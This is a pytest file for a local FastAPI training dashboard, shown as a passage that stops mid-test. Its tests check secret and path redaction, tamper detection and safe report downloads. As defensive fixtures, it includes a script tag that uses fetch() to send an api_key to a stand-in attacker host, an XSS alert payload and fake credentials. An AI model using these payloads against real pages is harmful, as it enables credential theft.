from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse
from fastapi.testclient import TestClient

from spritelab import __main__ as package_cli
from spritelab.product_core import (
    ProductAction,
    ProductCapability,
    ProductEvent,
    ProductPlugin,
    ProductResult,
    ProductStatus,
    ProjectContext,
    WebAssetBundle,
    WebNavigationItem,
    WebSecurityError,
    WebServerSettings,
)
from spritelab.product_web import cli as web_cli
from spritelab.product_web.app import create_app
from spritelab.product_web.components import bar_chart, distribution, image_gallery, line_chart, run_timeline
from spritelab.product_web.events import EventRepository, sanitize_public_text
from spritelab.v3.config import ProjectConfig


def _context(tmp_path: Path, *, name: str = "Demo sprites") -> ProjectContext:
    runs = tmp_path / "runs" / "v3"
    runs.mkdir(parents=True)
    return ProjectContext(
        project_root=tmp_path,
        config={"project": {"name": name}},
        config_path=tmp_path / "spritelab.yaml",
        runs_directory=runs,
    )


def _result(
    status: ProductStatus = ProductStatus.READY,
    message: str = "Feature is ready.",
    *,
    usable_images: int | None = None,
    action: ProductAction | None = None,
    data: dict[str, Any] | None = None,
) -> ProductResult:
    payload = dict(data or {})
    if usable_images is not None:
        payload["usable_images"] = usable_images
    return ProductResult(status=status, message=message, action=action, data=payload)


def _plugin(
    *,
    plugin_id: str = "dataset.demo",
    title: str = "Dataset",
    path: str = "/dataset",
    result: ProductResult | None = None,
    required: tuple[str, ...] = (),
    capabilities: tuple[ProductCapability, ...] = (),
    router_text: str | None = "Dataset plugin page",
    extra_navigation: tuple[WebNavigationItem, ...] = (),
    assets: tuple[WebAssetBundle, ...] = (),
    status_provider: Callable[[ProjectContext], ProductResult] | None = None,
) -> ProductPlugin:
    def router_factory(_context: ProjectContext) -> APIRouter:
        router = APIRouter()

        @router.get(path, response_class=HTMLResponse)
        async def plugin_page() -> str:
            return router_text or ""

        return router

    return ProductPlugin(
        plugin_id=plugin_id,
        title=title,
        cli_registration=lambda _registry: None,
        status_provider=status_provider or (lambda _context: result or _result()),
        capability_probe=lambda _context: capabilities,
        web_router_factory=router_factory if router_text is not None else None,
        navigation=(WebNavigationItem(plugin_id, title, path, 15), *extra_navigation),
        required_backend_capabilities=required,
        web_assets=assets,
    )


def test_home_computes_each_plugin_status_once_per_request(tmp_path: Path) -> None:
    context = _context(tmp_path)
    calls = {"dataset.demo": 0, "training.demo": 0}

    def counted(plugin_id: str) -> Callable[[ProjectContext], ProductResult]:
        def status_provider(_context: ProjectContext) -> ProductResult:
            calls[plugin_id] += 1
            return _result()

        return status_provider

    app = create_app(
        context,
        plugins=(
            _plugin(status_provider=counted("dataset.demo")),
            _plugin(
                plugin_id="training.demo",
                title="Training",
                path="/training",
                status_provider=counted("training.demo"),
            ),
        ),
    )
    client = TestClient(app)

    assert calls == {"dataset.demo": 0, "training.demo": 0}
    assert client.get("/").status_code == 200
    assert calls == {"dataset.demo": 1, "training.demo": 1}
    assert client.get("/").status_code == 200
    assert calls == {"dataset.demo": 2, "training.demo": 2}


def test_plugin_template_shell_skips_cross_plugin_status_and_run_replay(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    context = _context(tmp_path)
    calls = {"dataset.demo": 0, "training.demo": 0, "current_run": 0}

    def counted_status(plugin_id: str) -> Callable[[ProjectContext], ProductResult]:
        def status_provider(_context: ProjectContext) -> ProductResult:
            calls[plugin_id] += 1
            return _result()

        return status_provider

    def current_run(_repository: EventRepository) -> None:
        calls["current_run"] += 1
        return None

    def router_factory(_context: ProjectContext) -> APIRouter:
        router = APIRouter()

        @router.get("/dataset", response_class=HTMLResponse)
        async def plugin_page(request: Request) -> Any:
            renderer = request.app.state.spritelab_render_plugin_template
            return renderer(
                request,
                "dataset.demo",
                "technical_details.html",
                {"stack": (), "plugin_titles": ()},
            )

        return router

    monkeypatch.setattr(EventRepository, "current_run", current_run)
    dataset = ProductPlugin(
        plugin_id="dataset.demo",
        title="Dataset",
        cli_registration=lambda _registry: None,
        status_provider=counted_status("dataset.demo"),
        capability_probe=lambda _context: (),
        web_router_factory=router_factory,
        navigation=(WebNavigationItem("dataset", "Dataset", "/dataset", 10),),
        web_assets=(WebAssetBundle("spritelab.product_web"),),
    )
    training = _plugin(
        plugin_id="training.demo",
        title="Training",
        path="/training",
        status_provider=counted_status("training.demo"),
    )
    client = TestClient(create_app(context, plugins=(dataset, training)))

    response = client.get("/dataset")

    assert response.status_code == 200
    assert "Technical details" in response.text
    assert calls == {"dataset.demo": 0, "training.demo": 0, "current_run": 0}


def test_home_reuses_one_current_run_projection(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    context = _context(tmp_path)
    current_run_calls = 0

    def current_run(_repository: EventRepository) -> None:
        nonlocal current_run_calls
        current_run_calls += 1
        return None

    monkeypatch.setattr(EventRepository, "current_run", current_run)
    client = TestClient(create_app(context, plugins=(_plugin(),)))

    assert client.get("/").status_code == 200
    assert current_run_calls == 1


def _write_run(
    context: ProjectContext,
    *,
    run_id: str = "20260713T100000Z-train-demo",
    terminal: bool = False,
    secret_log: bool = False,
    second_metrics: dict[str, Any] | None = None,
) -> tuple[str, list[ProductEvent]]:
    assert context.runs_directory is not None
    directory = context.runs_directory / run_id
    status = ProductStatus.COMPLETE if terminal else ProductStatus.RUNNING
    events = [
        ProductEvent(
            run_id=run_id,
            timestamp="2026-07-13T10:00:00+00:00",
            feature="training",
            stage="prepare-data",
            event_type="stage_started",
            status=ProductStatus.RUNNING,
            current=0,
            total=100,
            message="Preparing images.",
        ),
        ProductEvent(
            run_id=run_id,
            timestamp="2026-07-13T10:02:00+00:00",
            feature="training",
            stage="optimize-model",
            event_type="run_finished" if terminal else "progress",
            status=status,
            current=100 if terminal else 40,
            total=100,
            message="Training complete." if terminal else "Processed batch 40.",
            metrics={
                "loss": 0.42,
                "pause_available": not terminal,
                "cancel_available": not terminal,
                **(second_metrics or {}),
            },
            artifact_references=(r"C:\example\checkpoint.safetensors",),
        ),
    ]
    repository = EventRepository(context.runs_directory)
    repository.initialize_run(
        run_id,
        feature="training",
        command="training",
        command_payload={},
        planned_event=events[0],
        started_at=events[0].timestamp,
        resumable=not terminal,
    )
    repository.append(events[1])
    repository.update_state(
        run_id,
        ended_at=events[1].timestamp if terminal else None,
        resumable=not terminal,
    )
    log = "step=40 loss=0.42\n"
    if secret_log:
        log += f"API_KEY=super-secret Authorization=Bearer runtime-secret project_root={context.project_root}\n"
    (directory / "logs" / "run.log").write_text(log, encoding="utf-8")
    if terminal:
        (directory / "report" / "index.html").write_text("<h1>Offline report</h1>", encoding="utf-8")
    return run_id, events


def test_runs_page_reuses_full_projection_for_older_active_run(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    context = _context(tmp_path)
    repository = EventRepository(context.runs_directory)

    def initialize_run(run_id: str, *, started_at: str, terminal: bool) -> None:
        status = ProductStatus.COMPLETE if terminal else ProductStatus.RUNNING
        repository.initialize_run(
            run_id,
            feature="training",
            command="training",
            command_payload={},
            planned_event=ProductEvent(
                run_id=run_id,
                timestamp=started_at,
                feature="training",
                stage="optimize-model",
                event_type="run_finished" if terminal else "progress",
                status=status,
                current=100 if terminal else 40,
                total=100,
                message="Training complete." if terminal else "Training sprites.",
            ),
            started_at=started_at,
            resumable=not terminal,
        )

    active_run_id = "20260713T090000Z-train-active"
    initialize_run(
        active_run_id,
        started_at="2026-07-13T09:00:00+00:00",
        terminal=False,
    )
    terminal_run_ids: list[str] = []
    for minute in range(21):
        run_id = f"20260714T10{minute:02d}00Z-train-terminal"
        terminal_run_ids.append(run_id)
        initialize_run(
            run_id,
            started_at=f"2026-07-14T10:{minute:02d}:00+00:00",
            terminal=True,
        )

    original_recent_runs = EventRepository.recent_runs
    recent_run_limits: list[int] = []

    def recent_runs(repository: EventRepository, *, limit: int = 20) -> list[Any]:
        recent_run_limits.append(limit)
        return original_recent_runs(repository, limit=limit)

    def unexpected_current_run(_repository: EventRepository) -> None:
        raise AssertionError("/runs must derive the current run from its existing projection")

    monkeypatch.setattr(EventRepository, "recent_runs", recent_runs)
    monkeypatch.setattr(EventRepository, "current_run", unexpected_current_run)

    response = TestClient(create_app(context)).get("/runs")

    assert response.status_code == 200
    assert recent_run_limits == [100]
    assert f'href="/runs/{active_run_id}"' in response.text
    assert f"{active_run_id}</small>" not in response.text
    assert "20 shown" in response.text
    assert terminal_run_ids[0] not in response.text
    assert terminal_run_ids[-1] in response.text


def test_app_starts_on_loopback_and_v3_dispatches_to_web(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    context = _context(tmp_path)
    app = create_app(context)
    assert app.state.spritelab_settings.host == "127.0.0.1"
    dispatched: list[list[str]] = []
    monkeypatch.setattr(web_cli, "main", lambda argv=(): dispatched.append(list(argv)))
    package_cli.main(["v3"])
    package_cli.main(["v3", "app", "--no-open"])
    assert dispatched == [[], ["--no-open"]]


def test_browser_launch_is_mocked_and_no_open_is_honored(monkeypatch: pytest.MonkeyPatch) -> None:
    class FakeSocket:
        def setsockopt(self, *_args: Any) -> None: ...

        def bind(self, address: tuple[str, int]) -> None:
            self.address = address

        def listen(self, _backlog: int) -> None: ...

        def getsockname(self) -> tuple[str, int]:
            return (self.address[0], 43123)

    opened: list[str] = []
    runs: list[Any] = []
    monkeypatch.setattr(web_cli.socket, "socket", lambda *_args: FakeSocket())
    monkeypatch.setattr(web_cli.webbrowser, "open", lambda url: opened.append(url))
    monkeypatch.setattr("uvicorn.Server.run", lambda _self, **kwargs: runs.append(kwargs))
    settings = WebServerSettings()
    web_cli.run_server(object(), settings, open_browser=True)
    web_cli.run_server(object(), settings, open_browser=False)
    assert opened == ["http://127.0.0.1:43123/"]
    assert len(runs) == 2


def test_cli_no_open_and_non_loopback_validation(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    config = ProjectConfig(
        root=tmp_path,
        path=None,
        values={
            "project": {"name": "Demo"},
            "paths": {"runs": "runs"},
            "ui": {"host": "127.0.0.1", "port": "auto", "open_browser": True},
        },
    )
    captured: list[tuple[WebServerSettings, bool]] = []
    monkeypatch.setattr(web_cli.ProjectConfig, "load", lambda **_kwargs: config)
    monkeypatch.setattr(web_cli, "_interactive_desktop", lambda: True)
    monkeypatch.setattr(
        web_cli,
        "run_server",
        lambda _app, settings, *, open_browser: captured.append((settings, open_browser)),
    )
    web_cli.main(["--no-open"])
    assert captured[0][0].host == "127.0.0.1"
    assert captured[0][1] is False
    with pytest.raises(WebSecurityError):
        web_cli._settings(config, web_cli.build_parser().parse_args(["--host", "0.0.0.0"]))


def test_plugin_router_navigation_status_actions_and_assets_mount(tmp_path: Path) -> None:
    context = _context(tmp_path)
    action = ProductAction("prepare", "dataset", "Prepare dataset")
    plugin = _plugin(
        result=_result(ProductStatus.READY, "Dataset ready.", usable_images=1800, action=action),
        assets=(WebAssetBundle("spritelab.product_web"),),
    )
    client = TestClient(create_app(context, plugins=[plugin]))
    assert client.get("/dataset").text == "Dataset plugin page"
    home = client.get("/").text
    assert "1,800 usable images" in home
    assert "Dataset ready." in home
    assert "Prepare dataset" in home
    assert client.get("/plugins/dataset.demo/static/app.css").status_code == 200


def test_unavailable_plugin_is_a_product_state_not_a_route_error(tmp_path: Path) -> None:
    context = _context(tmp_path)
    plugin = _plugin(
        plugin_id="training.demo",
        title="Training",
        path="/training",
        required=("compute.training",),
    )
    response = TestClient(create_app(context, plugins=[plugin])).get("/training")
    assert response.status_code == 200
    assert "Training is not available yet" in response.text
    assert "Required capability is not registered: compute.training." in response.text


def test_default_training_unavailable_reason_is_plain_language(tmp_path: Path) -> None:
    response = TestClient(create_app(_context(tmp_path))).get("/training")
    assert response.status_code == 200
    assert "Training is not available yet" in response.text
    assert "No training backend is registered." in response.text


def test_navigation_has_primary_areas_and_hides_developer_entries(tmp_path: Path) -> None:
    context = _context(tmp_path)
    plugin = _plugin(
        extra_navigation=(
            WebNavigationItem("gallery", "Gallery", "/gallery", 45),
            WebNavigationItem("developer-audit", "Developer audit", "/dev/audit", 46),
        )
    )
    page = TestClient(create_app(context, plugins=[plugin])).get("/").text
    for title in ("Home", "Dataset", "Training", "Evaluation", "Playground", "Runs", "Settings", "Gallery"):
        assert f">{title}<" in page
    assert "Developer audit" not in page
    assert "commit" not in page.lower()
    assert "branch" not in page.lower()


def test_home_answers_readiness_and_recommends_training(tmp_path: Path) -> None:
    context = _context(tmp_path)
    dataset = _plugin(result=_result(ProductStatus.READY, "Ready", usable_images=1800))
    training = _plugin(
        plugin_id="training.demo",
        title="Training",
        path="/training",
        result=_result(ProductStatus.NOT_STARTED, "Not started"),
    )
    evaluation = _plugin(
        plugin_id="evaluation.demo",
        title="Evaluation",
        path="/evaluation",
        result=_result(ProductStatus.UNAVAILABLE, "Waiting for a checkpoint"),
    )
    page = TestClient(create_app(context, plugins=[dataset, training, evaluation])).get("/").text
    assert "1,800 usable images" in page
    assert "Not started" in page
    assert "Waiting for a checkpoint" in page
    assert "Recommended next step" in page
    assert "Start training" in page


def test_sse_events_replay_reconnect_and_filter_secret_metrics(tmp_path: Path) -> None:
    context = _context(tmp_path)
    hostile_values = {
        "privateKey": "EVENT-PRIVATE-KEY-VALUE",
        "accessKey": "EVENT-ACCESS-KEY-VALUE",
        "awsAccessKeyId": "EVENT-AWS-ACCESS-KEY-ID-VALUE",
        "privateKeyPem": "EVENT-PRIVATE-KEY-PEM-VALUE",
        "apiKeyId": "EVENT-API-KEY-ID-VALUE",
        "clientSecretId": "EVENT-CLIENT-SECRET-ID-VALUE",
        "Private Key": "EVENT-SPACED-PRIVATE-KEY-VALUE",
        "Access-Key": "EVENT-HYPHEN-ACCESS-KEY-VALUE",
        "sig": "EVENT-SIGNED-URL-SECRET",
    }
    run_id, _events = _write_run(
        context,
        second_metrics={
            "auth_token": "do-not-return",
            **hostile_values,
            "hostileNested": {"awsAccessKeyId": "EVENT-NESTED-ACCESS-KEY-VALUE"},
            "publicKey": "documented",
            "secretary": "available",
            "tokenizer": "bpe",
        },
    )
    client = TestClient(create_app(context, event_poll_interval=0.01))
    all_events = client.get(f"/api/runs/{run_id}/events?once=true")
    assert all_events.status_code == 200
    assert "event: product" in all_events.text
    assert "id: 1" in all_events.text and "id: 2" in all_events.text
    reconnect = client.get(f"/api/runs/{run_id}/events?once=true", headers={"Last-Event-ID": "1"})
    assert "Preparing images" not in reconnect.text
    assert "Processed batch 40" in reconnect.text
    assert "do-not-return" not in reconnect.text
    for key, secret_value in hostile_values.items():
        assert key not in reconnect.text
        assert secret_value not in reconnect.text
    assert "EVENT-NESTED-ACCESS-KEY-VALUE" not in reconnect.text
    assert "hostileNested" not in reconnect.text
    reconnect_payloads = [
        json.loads(line.removeprefix("data: ")) for line in reconnect.text.splitlines() if line.startswith("data: ")
    ]
    public_metrics = next(payload["metrics"] for payload in reconnect_payloads if "event_type" in payload)
    assert public_metrics["publicKey"] == "documented"
    assert public_metrics["secretary"] == "available"
    assert public_metrics["tokenizer"] == "bpe"


@pytest.mark.parametrize(
    ("private_text", "expected"),
    (
        (
            "Keep this prefix; credential_reference=credential-value-9Z-secret; keep this suffix.",
            "Keep this prefix; credential_reference=[redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; password_hash='password-value-9Z-secret'; keep this suffix.",
            "Keep this prefix; password_hash=[redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; client_secret_id: client-value-9Z-secret; keep this suffix.",
            "Keep this prefix; client_secret_id: [redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; awsAccessKeyId=aws-value-9Z-private; keep this suffix.",
            "Keep this prefix; awsAccessKeyId=[redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; privateKeyPem='pem-value-9Z-private'; keep this suffix.",
            "Keep this prefix; privateKeyPem=[redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; apiKeyId: api-id-value-9Z-private; keep this suffix.",
            "Keep this prefix; apiKeyId: [redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; clientSecretId=client-id-value-9Z-private; keep this suffix.",
            "Keep this prefix; clientSecretId=[redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; Private Key: private-value-9Z-private; keep this suffix.",
            "Keep this prefix; Private Key: [redacted]; keep this suffix.",
        ),
        (
            "Keep this prefix; Access Key: access-value-9Z-private; keep this suffix.",
            "Keep this prefix; Access Key: [redacted]; keep this suffix.",
        ),
        (
            "Safe fields publicKey=documented secretary=available tokenizer=bpe remain visible.",
            "Safe fields publicKey=documented secretary=available tokenizer=bpe remain visible.",
        ),
        (
            "Read file:///" + "home/alice/private/model.pt; then retry.",
            "Read file://<local-path>; then retry.",
        ),
        (
            "Read file:///C:/" + "Users/Alice/private/model.pt, then retry.",
            "Read file://<local-path>, then retry.",
        ),
        (
            "Read file://server/private/model.pt; then retry.",
            "Read file://<local-path>; then retry.",
        ),
        (
            "Read path:/" + "home/alice/private/model.pt; then retry.",
            "Read path:<local-path>; then retry.",
        ),
        (
            "Read source=//server/share/private/model.pt; then retry.",
            "Read source=<local-path>; then retry.",
        ),
        (
            "Download https://blob.example.test/object?sv=1&sig=AZURESASSECRET&se=tomorrow.",
            "Download https://blob.example.test/object?sv=1&sig=[redacted]&se=tomorrow.",
        ),
        (
            "-----BEGIN " + "OPENSSH PRIVATE KEY-----\nPRIVATEKEYSECRET\n-----END OPENSSH PRIVATE KEY-----",
            "[redacted]",
        ),
        (
            "Prefix -----BEGIN " + "PRIVATE KEY-----\nTRUNCATEDPRIVATEKEYSECRET",
            "Prefix [redacted]",
        ),
        (
            "-----BEGIN CERTIFICATE-----\nPUBLICCERTIFICATE\n-----END CERTIFICATE-----",
            "-----BEGIN CERTIFICATE-----\nPUBLICCERTIFICATE\n-----END CERTIFICATE-----",
        ),
        (
            "The signal=strong value and signature algorithm documentation remain visible.",
            "The signal=strong value and signature algorithm documentation remain visible.",
        ),
        (
            "Documentation remains at https://example.test/public/model.pt.",
            "Documentation remains at https://example.test/public/model.pt.",
        ),
    ),
)
def test_public_text_redacts_suffix_secret_keys_and_file_uris(
    private_text: str,
    expected: str,
) -> None:
    assert sanitize_public_text(private_text) == expected


def test_sse_projections_redact_paths_and_secrets_without_mutating_durable_bytes(tmp_path: Path) -> None:
    context = _context(tmp_path)
    assert context.runs_directory is not None
    run_id = "20260714T120000Z-training-private-metric"
    checkpoint = context.project_root / "artifacts" / "checkpoint_step_500.pt"
    bearer_secret = "bearer-value-9Z-secret"
    api_secret = "api-value-9Z-secret"
    credential_secret = "credential-value-9Z-secret"
    password_secret = "password-value-9Z-secret"
    raw_secret = "sk-" + "abcdefghijklmnopqrstuvwxyz1234567890"
    stage_secret = "STAGESECRET"
    feature_secret = "FEATURESECRET"
    event_type_secret = "EVENTTYPESECRET"
    artifact_secret = "SUPERSECRET"
    credential_reference_secret = "CREDENTIALREFERENCESECRET"
    password_hash_secret = "PASSWORDHASHSECRET"
    client_secret_id_secret = "CLIENTSECRETIDSECRET"
    private_posix_uri = "file:///" + "home/alice/private/model.pt"
    private_windows_uri = "file:///C:/" + "Users/Alice/private/model.pt"
    message = (
        f"Authorization: Bearer {bearer_secret} API_KEY={api_secret} credential={credential_secret} "
        f"credential_reference={credential_reference_secret} source={private_posix_uri} raw={raw_secret}"
    )
    event = ProductEvent(
        run_id=run_id,
        timestamp="2026-07-14T12:00:00+00:00",
        feature=f"training Authorization=Bearer {feature_secret}",
        stage=f"Authorization=Bearer {stage_secret}",
        event_type=f"checkpoint api_key={event_type_secret}",
        status=ProductStatus.RUNNING,
        current=500,
        total=5000,
        message=message,
        metrics={
            "checkpoint": str(checkpoint),
            "checkpoint_note": f"Saved checkpoint at {checkpoint}; password='{password_secret}'",
            "external_windows_checkpoint": r"D:\private\outside_checkpoint.pt",
            "external_posix_checkpoint": "/private/outside_checkpoint.pt",
            "api_key": api_secret,
            "provider_detail": raw_secret,
            "endpoint": f"https://sprite-user:{password_secret}@example.test/api",
            "safe_label": "seed 1",
            r"C:/private/metric": "bounded",
        },
        artifact_references=(f"C:/private/api_key={artifact_secret}.pt",),
    )
    repository = EventRepository(context.runs_directory, private_roots=(context.project_root,))
    repository.initialize_run(
        run_id,
        feature="training",
        command="training",
        command_payload={},
        planned_event=event,
        started_at=event.timestamp,
        resumable=True,
    )
    event_path = context.runs_directory / run_id / "events.jsonl"
    state_path = context.runs_directory / run_id / "state.json"
    log_path = context.runs_directory / run_id / "logs" / "run.log"
    log_path.write_text(
        f"Authorization=Bearer {bearer_secret} api_key={api_secret} credential={credential_secret} "
        f"password_hash={password_hash_secret} client_secret_id={client_secret_id_secret} "
        f"source={private_windows_uri}\n",
        encoding="utf-8",
    )
    canonical_before = event_path.read_bytes()
    state_before = state_path.read_bytes()
    log_before = log_path.read_bytes()
    assert json.loads(canonical_before)["metrics"]["checkpoint"] == str(checkpoint)
    for secret in (
        bearer_secret,
        api_secret,
        credential_secret,
        password_secret,
        raw_secret,
        stage_secret,
        feature_secret,
        event_type_secret,
        artifact_secret,
        credential_reference_secret,
        password_hash_secret,
        client_secret_id_secret,
    ):
        assert secret.encode() in canonical_before + state_before + log_before

    client = TestClient(create_app(context))
    response = client.get(f"/api/runs/{run_id}/events?once=true")
    log_response = client.get(f"/api/runs/{run_id}/logs?once=true")
    run_page = client.get(f"/runs/{run_id}")
    current_run = client.get("/api/current-run")

    assert response.status_code == 200
    assert log_response.status_code == 200
    assert run_page.status_code == 200
    assert current_run.status_code == 200
    for secret in (
        bearer_secret,
        api_secret,
        credential_secret,
        password_secret,
        raw_secret,
        stage_secret,
        feature_secret,
        event_type_secret,
        artifact_secret,
        credential_reference_secret,
        password_hash_secret,
        client_secret_id_secret,
    ):
        assert secret not in response.text
        assert secret not in log_response.text
        assert secret not in run_page.text
        assert secret not in current_run.text
    assert "[redacted]" in response.text
    assert "[redacted]" in log_response.text
    assert private_posix_uri not in response.text
    assert private_windows_uri not in log_response.text
    assert "file://<local-path>" in response.text
    assert "file://<local-path>" in log_response.text
    payloads = [
        json.loads(line.removeprefix("data: ")) for line in response.text.splitlines() if line.startswith("data: ")
    ]
    event_payload = next(payload for payload in payloads if "event_type" in payload)
    snapshot_payload = next(payload for payload in payloads if "terminal" in payload)
    assert event_payload["feature"] == "training Authorization=[redacted]"
    assert event_payload["stage"] == "Authorization=[redacted]"
    assert event_payload["event_type"] == "checkpoint api_key=[redacted]"
    assert snapshot_payload["feature"] == "training Authorization=[redacted]"
    assert snapshot_payload["stage"] == "Authorization=[redacted]"
    assert snapshot_payload["timeline"][0]["stage"] == "Authorization=[redacted]"
    assert event_payload["artifact_references"] == ["api_key=[redacted]"]
    assert snapshot_payload["artifacts"] == ["api_key=[redacted]"]
    assert "[redacted]" in event_payload["message"]
    assert "[redacted]" in snapshot_payload["message"]
    assert "[redacted]" in snapshot_payload["recent_messages"][0]
    assert "[redacted]" in snapshot_payload["timeline"][0]["message"]
    public_metrics = [payload["metrics"] for payload in payloads if isinstance(payload.get("metrics"), dict)]
    assert len(public_metrics) == 2
    for metrics in public_metrics:
        assert str(context.project_root) not in metrics["checkpoint"]
        assert context.project_root.as_posix() not in metrics["checkpoint"]
        assert str(context.project_root) not in metrics["checkpoint_note"]
        assert context.project_root.as_posix() not in metrics["checkpoint_note"]
        assert metrics["external_windows_checkpoint"] == "outside_checkpoint.pt"
        assert metrics["external_posix_checkpoint"] == "outside_checkpoint.pt"
        assert "api_key" not in metrics
        assert metrics["provider_detail"] == "[redacted]"
        assert metrics["endpoint"] == "https://[redacted]@example.test/api"
        assert metrics["safe_label"] == "seed 1"
        assert metrics["metric"] == "bounded"
    assert event_path.read_bytes() == canonical_before
    assert state_path.read_bytes() == state_before
    assert log_path.read_bytes() == log_before


def test_completed_run_is_reconstructed_with_timeline_artifacts_logs_and_report(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context, terminal=True)
    client = TestClient(create_app(context))
    page = client.get(f"/runs/{run_id}")
    assert page.status_code == 200
    assert "Training complete." in page.text
    assert "100%" in page.text
    assert "Prepare Data" in page.text
    assert "checkpoint.safetensors" in page.text
    assert str(context.project_root) not in page.text
    report = client.get(f"/runs/{run_id}/report")
    assert report.status_code == 200
    assert report.headers["content-type"].startswith("application/json")
    assert "-public-report.json" in report.headers["content-disposition"]
    assert ".html" not in report.headers["content-disposition"]


def test_report_download_is_a_closed_inert_projection_and_never_serves_source_html(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context, terminal=True)
    assert context.runs_directory is not None
    source = context.runs_directory / run_id / "report" / "index.html"
    hostile = (
        "<script>fetch('https://attacker.invalid/?api_key=REPORTSECRET')</script>"
        f"<p>{context.project_root}</p><p>C:\\" + "Users\\Alice\\private.txt</p>"
        "<p>file:///" + "home/alice/private.txt</p>"
    ).encode()
    source.write_bytes(hostile)
    expected_snapshot = EventRepository(
        context.runs_directory,
        private_roots=(context.project_root,),
    ).snapshot(run_id)
    client = TestClient(create_app(context))

    response = client.get(f"/runs/{run_id}/report")

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("application/json")
    assert response.headers["content-disposition"] == f'attachment; filename="{run_id}-public-report.json"'
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["content-security-policy"] == "sandbox; default-src 'none'"
    assert response.headers["cache-control"] == "no-store"
    assert "<script>" not in response.text
    assert "REPORTSECRET" not in response.text
    assert str(context.project_root) not in response.text
    assert "C:\\" + "Users\\Alice" not in response.text
    assert "file:///" + "home/alice" not in response.text
    payload = response.json()
    assert set(payload) == {
        "schema_version",
        "run_id",
        "feature",
        "stage",
        "status",
        "message",
        "progress",
        "timing",
        "event_count",
        "terminal",
        "resumable",
        "report_available",
        "invalid_event_count",
    }
    assert payload["schema_version"] == "spritelab.product.public-run-report.v1"
    assert payload["run_id"] == run_id
    assert payload["status"] == expected_snapshot.status
    assert payload["progress"] == {"current": 100, "total": 100, "percent": 100}
    assert payload["terminal"] is expected_snapshot.terminal
    assert payload["report_available"] is expected_snapshot.report_available
    assert source.read_bytes() == hostile


def test_unverified_event_bytes_never_reach_sse_or_public_report(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context, terminal=True)
    assert context.runs_directory is not None
    repository = EventRepository(context.runs_directory, private_roots=(context.project_root,))
    assert repository.replay(run_id).integrity_status == "VALID"

    event_path = context.runs_directory / run_id / "events.jsonl"
    lines = event_path.read_text(encoding="utf-8").splitlines()
    hostile = json.loads(lines[-1])
    hostile["current"] = 99
    hostile["message"] = "UNVERIFIED EVENT MESSAGE"
    hostile["metrics"]["pause_available"] = True
    event_path.write_text(
        "\n".join([*lines[:-1], json.dumps(hostile)]) + "\n",
        encoding="utf-8",
        newline="\n",
    )
    tampered_bytes = event_path.read_bytes()

    client = TestClient(create_app(context, event_poll_interval=0.01))
    events_response = client.get(f"/api/runs/{run_id}/events?once=true")
    report_response = client.get(f"/runs/{run_id}/report")

    assert events_response.status_code == 200
    assert "event: product" not in events_response.text
    assert "UNVERIFIED EVENT MESSAGE" not in events_response.text
    payloads = [
        json.loads(line.removeprefix("data: "))
        for line in events_response.text.splitlines()
        if line.startswith("data: ")
    ]
    warning = next(item for item in payloads if item.get("code") == "unverified_product_events")
    assert warning["invalid_event_count"] == 0
    snapshot = next(item for item in payloads if "terminal" in item)
    assert snapshot["status"] in {"NOT_COMPARABLE", "STALE"}
    assert snapshot["current"] == 0
    assert snapshot["total"] is None
    assert snapshot["event_count"] == 0
    assert snapshot["resumable"] is False

    assert report_response.status_code == 200
    report = report_response.json()
    assert report["status"] in {"NOT_COMPARABLE", "STALE"}
    assert report["progress"] == {"current": 0, "total": None, "percent": None}
    assert report["event_count"] == 0
    assert report["resumable"] is False
    assert "UNVERIFIED EVENT MESSAGE" not in report_response.text
    assert event_path.read_bytes() == tampered_bytes


def test_live_progress_counters_eta_messages_and_action_visibility(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context)
    repository = EventRepository(context.runs_directory)
    snapshot = repository.snapshot(run_id)
    assert snapshot.current == 40
    assert snapshot.total == 100
    assert snapshot.progress_percent == 40
    assert snapshot.elapsed_seconds == 120
    assert snapshot.eta_seconds == 180
    assert snapshot.recent_messages[-1] == "Processed batch 40."
    page = TestClient(create_app(context)).get(f"/runs/{run_id}").text
    assert "40 / 100" in page
    assert "3m 0s" in page
    assert ">Pause<" in page and ">Cancel<" in page
    assert f'data-run-id="{run_id}"' in page


def test_no_data_charts_are_offline_responsive_and_textual() -> None:
    for component in (line_chart([]), bar_chart([]), distribution([]), image_gallery([]), run_timeline([])):
        assert "No data available" in str(component)
        assert "http" not in str(component)
    chart = str(line_chart([("one", 1), ("three", 3)], title="Loss"))
    assert "viewBox" in chart
    assert "Text data for Loss" in chart
    assert "one" in chart and "three" in chart
    assert "two" not in chart


def test_dark_mode_narrow_layout_accessibility_and_offline_assets(tmp_path: Path) -> None:
    client = TestClient(create_app(_context(tmp_path)))
    page = client.get("/").text
    css = client.get("/static/app.css").text
    javascript = client.get("/static/app.js").text
    assert ':root[data-theme="dark"]' in css
    assert "@media (max-width: 760px)" in css
    assert "prefers-reduced-motion" in css
    assert "focus-visible" in css
    assert 'aria-label="Primary"' in page
    assert 'aria-live="polite"' in page
    assert '<dialog id="notification-dialog"' in page
    combined = page + css + javascript
    assert "https://" not in combined and "cdn" not in combined.lower()


def test_html_is_escaped_and_log_secrets_and_private_paths_are_redacted(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context, secret_log=True)
    plugin = _plugin(result=_result(ProductStatus.READY, "<script>alert('x')</script>"))
    client = TestClient(create_app(context, plugins=[plugin]))
    home = client.get("/").text
